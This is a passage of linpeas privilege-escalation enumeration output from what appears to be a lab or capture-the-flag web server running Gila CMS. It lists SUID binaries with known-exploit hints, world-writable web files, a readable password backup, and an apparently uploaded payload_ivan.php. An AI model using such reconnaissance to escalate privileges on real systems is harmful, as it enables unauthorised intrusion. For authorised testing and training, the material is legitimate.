-rw-r--r-- 1 root root 81 Feb  6  2020 /var/lib/dpkg/alternatives/my.cnf



























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc





-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root root 11K May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 419K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 23K May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 61K May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root ssh 351K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K May 16  2018 /usr/bin/wall
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root mlocate 39K Nov 17  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/pam_extrausers_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu
  /etc/ld.so.conf.d/x86_64-linux-gnu_EGL.conf
/usr/lib/x86_64-linux-gnu/mesa-egl

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current env capabilities:
Current: =
Current proc capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3310 Apr 12  2016 sbin.dhclient
-rw-r--r-- 1 root root 1793 Jan 21  2020 usr.sbin.mysqld
-rw-r--r-- 1 root root 1527 Jan  5  2016 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1469 Sep  8  2017 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2020-02-06+18:54:07.1196134090 /opt/.password.bak
2020-02-06+18:28:50.0044226230 /var/www/html/assets/.htaccess

╔══════════╣ Unexpected in root
/initrd.img
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 16
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 89 root root 4096 Feb 13  2020 ..
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/root/
/var/www
/var/www/dev
/var/www/dev/index.html
/var/www/html
/var/www/html/composer.json
/var/www/html/index.php
/var/www/html/assets
/var/www/html/assets/.htaccess
/var/www/html/assets/gila-logo.png
/var/www/html/tmp
/var/www/html/tmp/.htaccess
/var/www/html/.htaccess
/var/www/html/sites
/var/www/html/sites/README.md
/var/www/html/app.yaml
/var/www/html/LICENSE
/var/www/html/log
/var/www/html/Dockerfile
/var/www/html/lib
/var/www/html/lib/prism
/var/www/html/lib/prism/prism.css
/var/www/html/lib/prism/prism.js
/var/www/html/lib/vue
/var/www/html/lib/vue/vue-editor.css
/var/www/html/lib/vue/vue.min.js
/var/www/html/lib/vue/vue-draggable.min.js
/var/www/html/lib/vue/vue-editor.js
/var/www/html/lib/CodeMirror

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/run/php

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/tmp/andre_backup.tar.gz
/var/log/syslog
/var/log/auth.log

logrotate 3.8.7

╔══════════╣ Files inside /home/www-data (limit 20)

╔══════════╣ Files inside others home (limit 20)
/var/www/dev/index.html
/var/www/html/composer.json
/var/www/html/index.php
/var/www/html/assets/.htaccess
/var/www/html/assets/payload_ivan.php
/var/www/html/assets/gila-logo.png
/var/www/html/tmp/.htaccess
/var/www/html/.htaccess
/var/www/html/sites/README.md
/var/www/html/app.yaml
/var/www/html/LICENSE
/var/www/html/log/error.log
/var/www/html/log/load.php
/var/www/html/log/sessions.log
/var/www/html/log/packages2update.json
/var/www/html/log/login.failed.log
/var/www/html/Dockerfile
/var/www/html/lib/prism/prism.css
/var/www/html/lib/prism/prism.js
/var/www/html/lib/vue/vue-editor.css
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 161 Mar 14 10:08 /tmp/andre_backup.tar.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 10464 Feb  6  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-first.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-auto.page
-rw-r--r-- 1 root root 2018 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2392 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 2500 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2295 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 1422 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 3073 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2543 Jun 24  2016 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-first.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-auto.page
-rw-r--r-- 1 root root 2020 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2371 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 2503 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2289 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 1420 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 3067 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2034 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1298 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2418 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 2530 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2308 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 1732 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 1427 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 3094 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 35792 May  8  2018 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 190591 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/.config.old
-rw-r--r-- 1 root root 0 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 3020 Feb  6  2020 /etc/apt/sources.bak
-rw-r--r-- 1 root root 610 Feb  6  2020 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Feb  6  2020 /etc/xml/xml-core.xml.old
-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak
-rwxrwxrwx 1 root root 866 Jul 10  2019 /var/www/html/src/core/views/admin/db_backup.php
-rwxrwxrwx 1 root root 3773 Jul 10  2019 /var/www/html/src/core/classes/db_backup.php
-rw-r--r-- 1 root root 128 Feb  6  2020 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 9038 Jan 16  2019 /lib/modules/4.4.0-142-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 9070 Jan 16  2019 /lib/modules/4.4.0-142-generic/kernel/drivers/net/team/team_mode_activebackup.ko

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:
total 16K
drwxr-xr-x  4 root root 4.0K Feb  6  2020 .
drwxr-xr-x 12 root root 4.0K Feb  6  2020 ..
drwxr-xr-x  2 root root 4.0K Feb  6  2020 dev
drwxrwxrwx  9 root root 4.0K Feb 13  2020 html

/var/www/dev:
total 12K
drwxr-xr-x 2 root root 4.0K Feb  6  2020 .

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 1391 Feb  6  2020 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Feb 26  2019 /etc/.pwd.lock
-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak
-rw-r--r-- 1 root root 0 Mar 14 09:22 /run/network/.ifstate.lock
-rwxrwxrwx 1 root root 1 Feb  6  2020 /var/www/html/assets/.htaccess
-rwxrwxrwx 1 root root 37 Jul 10  2019 /var/www/html/tmp/.htaccess
-rwxrwxrwx 1 root root 1065 Jul 10  2019 /var/www/html/.htaccess
-rwxrwxrwx 1 root root 37 Jul 10  2019 /var/www/html/lib/.htaccess
-rwxrwxrwx 1 root root 37 Jul 10  2019 /var/www/html/src/.htaccess
-rwxrwxrwx 1 root root 1 Jul 10  2019 /var/www/html/src/core/widgets/.htaccess
-rwxrwxrwx 1 root root 37 Jul 10  2019 /var/www/html/themes/.htaccess

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 161 Mar 14 10:08 /tmp/andre_backup.tar.gz
-rwxrwxrwx 1 www-data www-data 828098 Feb 10 12:38 /tmp/linpeas.sh
-rw-r--r-- 1 root root 16930 Feb  6  2020 /var/backups/apt.extended_states.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/opt/.password.bak
/run/lock
/run/lock/apache2
/run/php
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/tmp
/var/www/html
/var/www/html/.htaccess
/var/www/html/Dockerfile
/var/www/html/LICENSE
/var/www/html/app.yaml
/var/www/html/assets
/var/www/html/assets/.htaccess
/var/www/html/assets/payload_ivan.php
/var/www/html/composer.json
/var/www/html/config.default.php
/var/www/html/config.php
/var/www/html/index.php
/var/www/html/lib
/var/www/html/lib/.htaccess
/var/www/html/lib/CodeMirror
/var/www/html/lib/CodeMirror/codemirror.css
/var/www/html/lib/CodeMirror/codemirror.js
/var/www/html/lib/CodeMirror/css.js
/var/www/html/lib/CodeMirror/htmlmixed.js
/var/www/html/lib/CodeMirror/javascript.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/lib/bootstrap
/var/www/html/lib/bootstrap/bootstrap.min.css
/var/www/html/lib/bootstrap/bootstrap.min.js
/var/www/html/lib/font-awesome
/var/www/html/lib/font-awesome/css
/var/www/html/lib/font-awesome/css/font-awesome.min.css
/var/www/html/lib/font-awesome/fonts
/var/www/html/lib/font-awesome/fonts/fontawesome-webfont.woff
/var/www/html/lib/font-awesome/fonts/fontawesome-webfont.woff2
/var/www/html/lib/gila.min.css
/var/www/html/lib/gila.min.js
/var/www/html/lib/jquery
/var/www/html/lib/jquery/jquery-3.3.1.min.js
/var/www/html/lib/jquery/jquery-sortable.js
/var/www/html/lib/prism
/var/www/html/lib/prism/prism.css
/var/www/html/lib/prism/prism.js
/var/www/html/lib/select2
/var/www/html/lib/select2/select2.min.css
/var/www/html/lib/select2/select2.min.js
/var/www/html/lib/slick
/var/www/html/lib/slick/fonts
/var/www/html/lib/slick/fonts/slick.eot
/var/www/html/lib/slick/fonts/slick.ttf
/var/www/html/lib/slick/fonts/slick.woff
/var/www/html/lib/slick/slick-theme.css
/var/www/html/lib/slick/slick.css
/var/www/html/lib/slick/slick.min.js
/var/www/html/lib/tinymce
/var/www/html/lib/tinymce/jquery.tinymce.min.js
/var/www/html/lib/tinymce/langs
/var/www/html/lib/tinymce/langs/readme.md
/var/www/html/lib/tinymce/license.txt
/var/www/html/lib/tinymce/plugins
/var/www/html/lib/tinymce/plugins/advlist
/var/www/html/lib/tinymce/plugins/advlist/plugin.min.js
/var/www/html/lib/tinymce/plugins/anchor
/var/www/html/lib/tinymce/plugins/anchor/plugin.min.js
/var/www/html/lib/tinymce/plugins/autolink
/var/www/html/lib/tinymce/plugins/autolink/plugin.min.js
/var/www/html/lib/tinymce/plugins/autoresize
/var/www/html/lib/tinymce/plugins/autoresize/plugin.min.js
/var/www/html/lib/tinymce/plugins/autosave
/var/www/html/lib/tinymce/plugins/autosave/plugin.min.js
/var/www/html/lib/tinymce/plugins/bbcode
/var/www/html/lib/tinymce/plugins/bbcode/plugin.min.js
/var/www/html/lib/tinymce/plugins/charmap
/var/www/html/lib/tinymce/plugins/charmap/plugin.min.js
/var/www/html/lib/tinymce/plugins/code
/var/www/html/lib/tinymce/plugins/code/plugin.min.js
/var/www/html/lib/tinymce/plugins/codesample
/var/www/html/lib/tinymce/plugins/codesample/css
/var/www/html/lib/tinymce/plugins/codesample/css/prism.css
/var/www/html/lib/tinymce/plugins/codesample/plugin.min.js
/var/www/html/lib/tinymce/plugins/colorpicker
/var/www/html/lib/tinymce/plugins/colorpicker/plugin.min.js
/var/www/html/lib/tinymce/plugins/contextmenu
/var/www/html/lib/tinymce/plugins/contextmenu/plugin.min.js
/var/www/html/lib/tinymce/plugins/directionality
/var/www/html/lib/tinymce/plugins/directionality/plugin.min.js
/var/www/html/lib/tinymce/plugins/emoticons
/var/www/html/lib/tinymce/plugins/emoticons/img
/var/www/html/lib/tinymce/plugins/emoticons/plugin.min.js
/var/www/html/lib/tinymce/plugins/fullpage
/var/www/html/lib/tinymce/plugins/fullpage/plugin.min.js
/var/www/html/lib/tinymce/plugins/fullscreen
/var/www/html/lib/tinymce/plugins/fullscreen/plugin.min.js
/var/www/html/lib/tinymce/plugins/help
/var/www/html/lib/tinymce/plugins/help/img
/var/www/html/lib/tinymce/plugins/help/plugin.min.js
/var/www/html/lib/tinymce/plugins/hr
/var/www/html/lib/tinymce/plugins/hr/plugin.min.js
/var/www/html/lib/tinymce/plugins/image
/var/www/html/lib/tinymce/plugins/image/plugin.min.js
/var/www/html/lib/tinymce/plugins/imagetools
/var/www/html/lib/tinymce/plugins/imagetools/plugin.min.js
/var/www/html/lib/tinymce/plugins/importcss
/var/www/html/lib/tinymce/plugins/importcss/plugin.min.js
/var/www/html/lib/tinymce/plugins/insertdatetime
/var/www/html/lib/tinymce/plugins/insertdatetime/plugin.min.js
/var/www/html/lib/tinymce/plugins/legacyoutput
/var/www/html/lib/tinymce/plugins/legacyoutput/plugin.min.js
/var/www/html/lib/tinymce/plugins/link
/var/www/html/lib/tinymce/plugins/link/plugin.min.js
/var/www/html/lib/tinymce/plugins/lists
/var/www/html/lib/tinymce/plugins/lists/plugin.min.js
/var/www/html/lib/tinymce/plugins/media
/var/www/html/lib/tinymce/plugins/media/plugin.min.js
/var/www/html/lib/tinymce/plugins/nonbreaking
/var/www/html/lib/tinymce/plugins/nonbreaking/plugin.min.js
/var/www/html/lib/tinymce/plugins/noneditable
/var/www/html/lib/tinymce/plugins/noneditable/plugin.min.js
/var/www/html/lib/tinymce/plugins/pagebreak
/var/www/html/lib/tinymce/plugins/pagebreak/plugin.min.js
/var/www/html/lib/tinymce/plugins/paste
/var/www/html/lib/tinymce/plugins/paste/plugin.min.js
/var/www/html/lib/tinymce/plugins/preview
/var/www/html/lib/tinymce/plugins/preview/plugin.min.js
/var/www/html/lib/tinymce/plugins/print
/var/www/html/lib/tinymce/plugins/print/plugin.min.js
/var/www/html/lib/tinymce/plugins/save
/var/www/html/lib/tinymce/plugins/save/plugin.min.js
/var/www/html/lib/tinymce/plugins/searchreplace
/var/www/html/lib/tinymce/plugins/searchreplace/plugin.min.js
/var/www/html/lib/tinymce/plugins/spellchecker
/var/www/html/lib/tinymce/plugins/spellchecker/plugin.min.js
/var/www/html/lib/tinymce/plugins/tabfocus
/var/www/html/lib/tinymce/plugins/tabfocus/plugin.min.js
/var/www/html/lib/tinymce/plugins/table
/var/www/html/lib/tinymce/plugins/table/plugin.min.js
/var/www/html/lib/tinymce/plugins/template
/var/www/html/lib/tinymce/plugins/template/plugin.min.js
/var/www/html/lib/tinymce/plugins/textcolor
/var/www/html/lib/tinymce/plugins/textcolor/plugin.min.js
/var/www/html/lib/tinymce/plugins/textpattern
/var/www/html/lib/tinymce/plugins/textpattern/plugin.min.js
/var/www/html/lib/tinymce/plugins/toc
/var/www/html/lib/tinymce/plugins/toc/plugin.min.js
/var/www/html/lib/tinymce/plugins/visualblocks
/var/www/html/lib/tinymce/plugins/visualblocks/css
/var/www/html/lib/tinymce/plugins/visualblocks/css/visualblocks.css
/var/www/html/lib/tinymce/plugins/visualblocks/plugin.min.js
/var/www/html/lib/tinymce/plugins/visualchars
/var/www/html/lib/tinymce/plugins/visualchars/plugin.min.js
/var/www/html/lib/tinymce/plugins/wordcount
/var/www/html/lib/tinymce/plugins/wordcount/plugin.min.js
/var/www/html/lib/tinymce/skins
/var/www/html/lib/tinymce/skins/lightgray
/var/www/html/lib/tinymce/skins/lightgray/content.inline.min.css
/var/www/html/lib/tinymce/skins/lightgray/content.min.css
/var/www/html/lib/tinymce/skins/lightgray/content.mobile.min.css
/var/www/html/lib/tinymce/skins/lightgray/fonts
/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce-mobile.woff
/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce-small.eot
/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce-small.ttf
/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce-small.woff
/var/www/html/lib/tinymce/skins/lightgray/fonts/tinymce.eot
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/lib/tinymce/skins/lightgray/img
/var/www/html/lib/tinymce/skins/lightgray/skin.min.css
/var/www/html/lib/tinymce/skins/lightgray/skin.mobile.min.css
/var/www/html/lib/tinymce/themes
/var/www/html/lib/tinymce/themes/modern
/var/www/html/lib/tinymce/themes/modern/theme.min.js
/var/www/html/lib/tinymce/tinymce.min.js
/var/www/html/lib/vue
/var/www/html/lib/vue/vue-draggable.min.js
/var/www/html/lib/vue/vue-editor.css
/var/www/html/lib/vue/vue-editor.js
/var/www/html/lib/vue/vue.min.js
/var/www/html/log
/var/www/html/log/error.log
/var/www/html/log/load.php
/var/www/html/log/login.failed.log
/var/www/html/log/packages2update.json
/var/www/html/log/sessions.log
/var/www/html/robots.txt
/var/www/html/sites
/var/www/html/sites/README.md
/var/www/html/src
/var/www/html/src/.htaccess
/var/www/html/src/Cocur
/var/www/html/src/Cocur/Slugify
/var/www/html/src/Cocur/Slugify/LICENSE
/var/www/html/src/Cocur/Slugify/Resources
/var/www/html/src/Cocur/Slugify/Resources/rules
/var/www/html/src/Cocur/Slugify/Resources/rules/arabic.json
/var/www/html/src/Cocur/Slugify/Resources/rules/austrian.json
/var/www/html/src/Cocur/Slugify/Resources/rules/azerbaijani.json
/var/www/html/src/Cocur/Slugify/Resources/rules/bulgarian.json
/var/www/html/src/Cocur/Slugify/Resources/rules/burmese.json
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/Cocur/Slugify/RuleProvider
/var/www/html/src/Cocur/Slugify/RuleProvider/DefaultRuleProvider.php
/var/www/html/src/Cocur/Slugify/RuleProvider/FileRuleProvider.php
/var/www/html/src/Cocur/Slugify/RuleProvider/RuleProviderInterface.php
/var/www/html/src/Cocur/Slugify/Slugify.php
/var/www/html/src/Cocur/Slugify/SlugifyInterface.php
/var/www/html/src/Cocur/Slugify/bin
/var/www/html/src/Cocur/Slugify/bin/generate-default.php
/var/www/html/src/blog
/var/www/html/src/blog/controllers
/var/www/html/src/blog/controllers/blog.php
/var/www/html/src/blog/load.php
/var/www/html/src/blog/package.json
/var/www/html/src/blog/views
/var/www/html/src/blog/views/blog-homepage.php
/var/www/html/src/core
/var/www/html/src/core/assets
/var/www/html/src/core/assets/admin
/var/www/html/src/core/assets/admin/content.css
/var/www/html/src/core/assets/admin/content.js
/var/www/html/src/core/assets/admin/listcomponent.js
/var/www/html/src/core/assets/admin/media.js
/var/www/html/src/core/assets/admin/style.css
/var/www/html/src/core/assets/cdn_paths.php
/var/www/html/src/core/assets/lazyImgLoad.js
/var/www/html/src/core/bootstrap.php
/var/www/html/src/core/classes
/var/www/html/src/core/classes/cache.php
/var/www/html/src/core/classes/controller.php
/var/www/html/src/core/classes/db.php
/var/www/html/src/core/classes/db_backup.php
/var/www/html/src/core/classes/event.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/core/controllers
/var/www/html/src/core/controllers/admin.php
/var/www/html/src/core/controllers/api.php
/var/www/html/src/core/controllers/cm.php
/var/www/html/src/core/controllers/fm.php
/var/www/html/src/core/controllers/login.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/core/install
/var/www/html/src/core/install/index.php
/var/www/html/src/core/install/install.form.php
/var/www/html/src/core/install/install.php
/var/www/html/src/core/install/install.sql.php
/var/www/html/src/core/install/installed.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/core/lang
/var/www/html/src/core/lang/admin
/var/www/html/src/core/lang/admin/el.json
/var/www/html/src/core/lang/admin/en.json
/var/www/html/src/core/lang/admin/es.json
/var/www/html/src/core/lang/admin/et.json
/var/www/html/src/core/lang/admin/fr.json
/var/www/html/src/core/lang/content
/var/www/html/src/core/lang/content/el.js
/var/www/html/src/core/lang/content/en.js
/var/www/html/src/core/lang/content/es.js
/var/www/html/src/core/lang/content/fr.js
/var/www/html/src/core/lang/de.json
/var/www/html/src/core/lang/el.json
/var/www/html/src/core/lang/en.json
/var/www/html/src/core/lang/es.json
/var/www/html/src/core/lang/et.json
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/core/lang/login/de.json
/var/www/html/src/core/lang/login/el.json
/var/www/html/src/core/lang/login/en.json
/var/www/html/src/core/lang/login/es.json
/var/www/html/src/core/lang/login/et.json
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/core/lang/myprofile
/var/www/html/src/core/lang/myprofile/en.json
/var/www/html/src/core/lang/myprofile/es.json
/var/www/html/src/core/lang/myprofile/fr.json
/var/www/html/src/core/lang/permissions
/var/www/html/src/core/lang/permissions/el.json
/var/www/html/src/core/lang/permissions/en.json
/var/www/html/src/core/lang/permissions/es.json
/var/www/html/src/core/lang/permissions/et.json
/var/www/html/src/core/lang/permissions/fr.json
/var/www/html/src/core/lib
/var/www/html/src/core/lib/gila.min.css
/var/www/html/src/core/lib/gila.min.js
/var/www/html/src/core/lib/vue-draggable.min.js
/var/www/html/src/core/load.php
/var/www/html/src/core/models
/var/www/html/src/core/models/menu.php
/var/www/html/src/core/models/page.php
/var/www/html/src/core/models/post.php
/var/www/html/src/core/models/profile.php
/var/www/html/src/core/models/user.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/core/package.json
/var/www/html/src/core/tables
/var/www/html/src/core/tables/page.php
/var/www/html/src/core/tables/post.php
/var/www/html/src/core/tables/postcategory.php
/var/www/html/src/core/tables/user-post.php
/var/www/html/src/core/tables/user.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/core/update.php
/var/www/html/src/core/views
/var/www/html/src/core/views/404.php
/var/www/html/src/core/views/admin
/var/www/html/src/core/views/admin/content-vue.php
/var/www/html/src/core/views/admin/contenttype.php
/var/www/html/src/core/views/admin/dashboard.php
/var/www/html/src/core/views/admin/db_backup.php
/var/www/html/src/core/views/admin/edit_widget.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/core/views/blog-author.php
/var/www/html/src/core/views/blog-category.php
/var/www/html/src/core/views/blog-feed.php
/var/www/html/src/core/views/blog-list.php
/var/www/html/src/core/views/blog-search.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/src/core/views/tpl/menu.bootstrap.php
/var/www/html/src/core/views/tpl/menu.php
/var/www/html/src/core/widgets
/var/www/html/src/core/widgets/.htaccess
/var/www/html/src/core/widgets/_widget_example
/var/www/html/src/core/widgets/_widget_example/_widget_example.php
/var/www/html/src/core/widgets/_widget_example/widget.php
/var/www/html/src/core/widgets/category-post
